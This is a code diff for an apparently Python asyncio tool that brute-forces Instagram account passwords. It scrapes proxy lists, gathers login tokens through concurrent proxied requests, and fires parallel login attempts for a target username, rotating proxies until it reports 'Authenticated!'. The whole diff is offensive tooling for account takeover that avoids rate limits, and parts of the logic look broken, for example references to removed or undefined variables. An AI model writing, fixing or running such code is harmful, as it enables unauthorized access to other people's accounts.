@@ -33,7 +33,6 @@ class Engine(object):
 
     def __init__(self, username):
         self.user = User(username)
-
         logging.setLoggerClass(EngineLogger)
         self.log = logging.getLogger(self.__loggers__['__base__'])
 
@@ -45,12 +44,9 @@ class EngineAsync(Engine):
         self.lock = asyncio.Lock()
 
         self.stop_event = asyncio.Event()
-        self.token_event = asyncio.Event()
-
         self.passwords = asyncio.Queue()
         self.attempts = asyncio.Queue()
 
-        self.token = None
         self.proxy_list = []
 
         # Just to make sure we are removing them correctly
@@ -80,7 +76,7 @@ class EngineAsync(Engine):
                 raise e
 
     @auto_logger
-    async def populate_passwords(self, queue, log):
+    async def populate_passwords(self, loop, log):
         """
         Retrieves passwords generated passwords that have not been attempted
         from the User object and populates the password queue.
@@ -88,15 +84,15 @@ class EngineAsync(Engine):
         count = 1
         for password in self.user.get_new_attempts():
             count += 1
-            queue.put_nowait(password)
+            self.passwords.put_nowait(password)
 
-        if queue.empty():
+        if self.passwords.empty():
             raise exceptions.EngineException("No new passwords to try.")
 
         log.info(f"Populated {count} Passwords")
 
     @auto_logger
-    async def populate_proxies(self, log):
+    async def populate_proxies(self, loop, log):
         """
         Retrieves proxies by using the ProxyApi to scrape links defined
         in settings.  Each returned response is parsed and converted into
@@ -128,77 +124,55 @@ class EngineAsync(Engine):
         log.info(f"Populated {len(self.proxy_list)} Proxies")
 
     @auto_logger(show_running=False)
-    async def get_token(self, log):
+    async def get_token(self, loop, log):
         """
-        TODO:
-        -----
-        Right now this is only doing one fetch at a time, which seems to be okay
-        since it is rather fast, but we might want to create tasks for the first
-        10 or so proxies.
+        Returns a list of tokens based on 20 concurrent requests to the Instagram
+        API.  On average, it returns about 6-7 tokens, which we will use as fallbacks
+        in case we need them when requests fail for token related reasons.
 
-        There seem to be issues when creating a task for every single
-        proxy when we don't really need to, so maybe just limit them
-        for purposes of finding a token.
-
-        This might be a good place for ThreadPoolExecutor to limit number
-        of tasks.
-
-        loop = asyncio.get_event_loop()
-        event = asyncio.Event()
-        executor = concurrent.futures.ThreadPoolExecutor(max_workers=10)
-
-        tasks = [
-            loop.run_in_executor(executor, self._get_token, event)
-            for i in range(10)
-        ]
-
-        completed, pending = await asyncio.wait(tasks, return_when=asyncio.FIRST_COMPLETED)
-        result = completed.pop()
-        self.token = result.result()
-
-        Won't let us use "async with lock" inside of callback since it is not
-        async, but this might cause problems if the proxy was already removed.
+        The higher the value of TOKEN_REQUEST_LIMIT (i.e. the number of
+        concurrent requests to retrieve a token), the slighly longer this process
+        takes, but the more bad proxies we can rule out from the get go.
         """
-        tasks = []
-
-        stop_event = asyncio.Event()
-        lock = asyncio.Lock()
-
         def callback(fut):
             exc = fut.exception()
             if exc:
                 if isinstance(exc, exceptions.BadProxyException):
                     self.log.warn(str(exc))
-                    self.proxy_list.remove(proxy)
-
-                    # Storing temporarily to make sure we are removing them and not
-                    # using them again.
-                    self.removed_proxies.append(proxy)
+                    self.proxy_list.remove(exc.proxy)
                 else:
-                    raise exc
-            else:
-                if not self.token:
-                    self.token = fut.result()
-                    log.success(f"Found Token {self.token}")
+                    self.log.errors(str(exc))
 
-                    stop_event.set()
-                    [task.cancel() for task in tasks]
+        async def find_tokens():
+            tasks = []
+            async with InstagramSession() as session:
+                for i in range(settings.TOKEN_REQUEST_LIMIT):
+                    proxy = self.proxy_list[i]
+                    task = asyncio.ensure_future(session.get_token(proxy))
+                    task.add_done_callback(callback)
+                    tasks.append(task)
 
-        async with InstagramSession() as session:
-            index = 0
-            while not stop_event.is_set() and len(self.proxy_list) != 0 and not self.token:
-                async with lock:
-                    proxy = self.proxy_list[index]
+                return await asyncio.gather(*tasks, return_exceptions=True)
 
-                task = asyncio.ensure_future(session.get_token(proxy))
-                task.add_done_callback(callback)
-                index += 1
+        async def filter_tokens(results):
+            """
+            For whatever reason, raising TokenNotInResponse in the session
+            is causing a None value to be returned instead of the exception.
+            For now, we will just filter out None as well.
+            """
+            tokens = []
+            for result in results:
+                if not isinstance(result, Exception) and result is not None:
+                    tokens.append(result)
+            return tokens
 
-                tasks.append(task)
+        # We do this 20 concurrent requests at a time, but there is a chance that
+        # all of the proxies are bad, so we would have to keep going.
+        results = []
+        while not results:
+            results = await find_tokens()
 
-                # Note commont in docstring for why this is not outside the
-                # while loop.
-                await asyncio.gather(*tasks, return_exceptions=True)
+        return await filter_tokens(results)
 
     @auto_logger
     async def attack(self, loop, log):
@@ -214,41 +188,44 @@ class EngineAsync(Engine):
             prep_tasks = (
                 loop.create_task(
                     self.handle_exception(
-                        self.populate_proxies(), loop
+                        self.populate_proxies(loop), loop
                     )
                 ),
                 loop.create_task(
                     self.handle_exception(
-                        self.populate_passwords(self.passwords), loop
+                        self.populate_passwords(loop), loop
                     )
                 )
             )
 
             await asyncio.gather(*prep_tasks)
 
-            retrieve_token = loop.create_task(
-                self.handle_exception(
-                    self.get_token(), loop
-                )
-            )
-            await asyncio.gather(retrieve_token)
-
             """
-            Still To Do:
+            Right now, we are not going to wrap this in handle_exceptions
+            because we do not have the exception handling sealed off enough
+            yet in order to allow the failed requests to not close the loop.
 
-            consume_passwords = loop.create_task(
-                self.handle_exception(
-                    self.consume_passwords(self.passwords), loop
-                )
-            )
-            consume_attempts = loop.create_task(
-                self.handle_exception(
-                    self.consume_attempts(self.attempts), loop
-                )
-            )
+            This might have something to do with return_exceptions **kwarg in the
+            asyncio.gather_tasks call.
             """
+            tokens = await asyncio.ensure_future(self.get_token(loop))
+
+            attack_tasks = (
+                loop.create_task(
+                    self.handle_exception(
+                        self.consume_passwords(tokens, loop), loop
+                    )
+                ),
+                loop.create_task(
+                    self.handle_exception(
+                        self.consume_attempts(tokens, loop), loop
+                    )
+                )
+            )
+            await asyncio.gather(*attack_tasks)
+
         finally:
-            logging.info('Cleaning up')
+            self.log.info('Cleaning up')
             loop.stop()
 
     @auto_logger(show_running=False)
@@ -264,39 +241,55 @@ class EngineAsync(Engine):
 
     @auto_logger(show_running=False)
     async def consume_passwords(self, queue, log):
+
+        def callback(fut):
+            exc = fut.exception()
+            if exc:
+                if isinstance(exc, exceptions.BadProxyException):
+                    self.log.warn(str(exc))
+                    self.proxy_list.remove(proxy)
+
+                    # Storing temporarily to make sure we are removing them and not
+                    # using them again.
+                    self.removed_proxies.append(proxy)
+                else:
+                    raise exc
+            else:
+                result = fut.result()
+                if result.accessed:
+                    log.success(f"Authenticated!")
+                    self.stop_event.set()
+                else:
+                    self.attempts.put_nowait(password)
+
         while not self.stop_event.is_set():
             try:
                 password = queue.get_nowait()
             except asyncio.QueueEmpty:
                 continue
             else:
-                # This will eventually throw an error when there are no more
-                # proxies, which we will have to figure out how to handle.
-                proxy = self.proxy_list[0]
+                async with InstagramSession() as session:
+                    assert self.token is not None
 
-                log.items(password=password, proxy=proxy.ip)
+                    tasks = []
+                    while not self.stop_event.is_set() and len(self.proxy_list):
+                        async with self.lock:
+                            proxy = self.proxy_list[0]
+                            assert proxy not in self.removed_proxies
 
-                session = InstagramSession(self.user, proxy=proxy)
-                try:
-                    results = session.login(password, self.token)
+                        task = asyncio.ensure_future(session.login(
+                            self.user.username,
+                            password,
+                            self.token,
+                            proxy,
+                        ))
 
-                # TODO: Have to handle this better for siutations in which the
-                # proxy is actually invalid instead of just a timeout.
-                except exceptions.ApiException as e:
-                    self._handle_login_api_error(e, log, proxy)
-                    async with self.lock:
-                        self.proxy_list.remove(proxy)
-                else:
-                    # self.queues.put('proxy', proxy)
-                    log.info(f"Got Results for {password}: {results}")
+                        task.add_done_callback(callback)
+                        tasks.append(task)
 
-                    if results.accessed:
-                        self.log.success("Accessed Account... Setting Stop Event")
-                        self.stop_event.set()
-                        queue.task_done()
-                    else:
-                        self.attempts.put_nowait(password)
-                    return results
+                    await asyncio.gather(*tasks, return_exceptions=True)
+
+        [task.cancel() for task in tasks]
 
     async def handle_exception(self, coro, loop):
         try:
